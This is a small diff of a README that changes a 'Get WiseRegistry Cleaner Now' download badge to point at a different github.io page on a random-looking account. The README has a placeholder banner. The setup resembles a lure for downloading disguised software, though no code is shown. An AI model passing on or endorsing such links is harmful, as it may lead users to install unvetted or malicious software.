@@ -4,7 +4,7 @@
 
 ![Banner Placeholder](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQBQPKRj5huH6FzUSY4_AguCltLC-i2tRXvyg&s)
 
-[![Get WiseRegistry Cleaner Now](https://img.shields.io/badge/Get_WiseRegistry_Cleaner-Now-0a5d8d?style=for-the-badge&logo=github)](https://wadiarufaiwh.github.io/.github/)
+[![Get WiseRegistry Cleaner Now](https://img.shields.io/badge/Get_WiseRegistry_Cleaner-Now-0a5d8d?style=for-the-badge&logo=github)](https://massimolongqdoj.github.io/.github/WiseRegistry-Cleaner)
 
 ---
 
